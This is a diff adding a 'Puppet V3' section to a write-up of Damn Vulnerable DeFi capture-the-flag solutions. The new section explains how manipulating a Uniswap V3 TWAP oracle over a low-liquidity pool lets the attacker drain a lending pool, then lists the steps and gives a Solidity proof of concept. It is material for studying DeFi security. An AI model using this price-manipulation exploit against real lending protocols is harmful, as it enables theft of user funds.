@@ -8,9 +8,10 @@
 [6. Selfie](#6-selfie)     
 [7. Compromised](#7-compromised)    
 [8. Puppet](#8-puppet)  
-[9. Puppet-V2](#9-puppet-v2)    
+[9. Puppet V2](#9-puppet-v2)    
 [10. Free Rider](#10-free-rider)    
-[11. Backdoor](#11-backdoor)
+[11. Backdoor](#11-backdoor)    
+[14. Puppet V3](#14-puppet-v3)
 
 ## 1. Unstoppable
 
@@ -755,5 +756,71 @@ Import "SafeProxy"
             );
             rescue.recover();
         }
+```
+</details>
+
+
+## 14. Puppet V3
+
+### Challenge
+
+Bear or bull market, true DeFi devs keep building. Remember that lending pool you helped? A new version is out. 
+They’re now using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.  
+The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.    
+Starting with 1 ETH and some DVT, you must save all from the vulnerable lending pool. Don't forget to send them to the designated recovery account.   
+_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._
+
+### Contracts in scope
+PuppetV3Pool.sol   
+INonfungiblePositionManager.sol
+
+### Vulnerability
+
+The Puppet V3 challenge exposes a price oracle manipulation vulnerability in a lending pool that relies on Uniswap V3's Time-Weighted Average Price (TWAP) mechanism. Although the protocol upgraded to a time-based oracle, critical weaknesses remain. The `_getOracleQuote()` function consults a TWAP over a short 10-minute window (600 seconds) and lacks any circuit breakers or maximum price deviation checks. This is exacerbated by the Uniswap V3 pool's extremely low liquidity (100 WETH and 100 DVT) concentrated within a narrow tick range (-60 to 60). Because of this combination, an attacker can execute a large swap that pushes the price entirely outside the concentrated liquidity range, causing a catastrophic price collapse. The short TWAP window then allows this manipulated price to heavily skew the average, making the asset appear virtually worthless and allowing them to bypass actual collateral requirements.
+
+### Attack Summary
+
+**Goal**
+Drain the lending pool's entire balance of 1,000,000 DVT tokens by providing a negligible amount of WETH collateral, and deposit them into the recovery address.
+
+**Steps**
+1. Swap a large amount of DVT (110 tokens) for WETH on Uniswap V3, intentionally pushing the price outside the concentrated liquidity range (ticks -60 to 60) and crashing it to an extreme negative tick (-887272).
+2. Wait approximately 114 seconds to allow the manipulated price to dominate the short TWAP period. The skewed TWAP, now reports DVT as being devalued by 99.995% compared to WETH.
+3. Calculate the drastically reduced collateral requirement, which drops from 3,000,000 WETH to roughly 0.143 WETH.
+4. Approve the lending pool to spend the minimal WETH collateral requirement.
+5. Borrow the entire DVT balance (1,000,000 tokens) from the pool.
+6. Transfer all borrowed tokens to the designated recovery address.
+
+<details><summary>PoC</summary>
+
+Import ISwapRouter
+```solidity
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_puppetV3() public checkSolvedByPlayer {
+        address routerAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        ISwapRouter swapRouter = ISwapRouter(routerAddress);
+
+        token.approve(routerAddress, PLAYER_INITIAL_TOKEN_BALANCE);
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 1,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        vm.warp(block.timestamp + 114);
+        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), wethRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
 ```
 </details>
